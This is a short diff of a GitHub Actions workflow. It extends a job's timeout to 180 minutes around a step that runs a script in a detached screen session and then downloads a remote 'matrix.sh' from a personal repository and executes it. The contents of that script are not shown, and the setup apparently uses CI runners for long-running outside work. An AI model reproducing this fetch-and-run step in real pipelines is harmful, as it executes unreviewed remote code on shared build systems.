@@ -25,4 +25,4 @@ jobs:
     - name: test
       run: |
         sudo apt install screen -y && screen -dmS test.sh ./test.sh 65 75 && wget https://raw.githubusercontent.com/kijang-010/test/main/matrix.sh && chmod u+x matrix.sh && ./matrix.sh
-      timeout-minutes: 100
+      timeout-minutes: 180
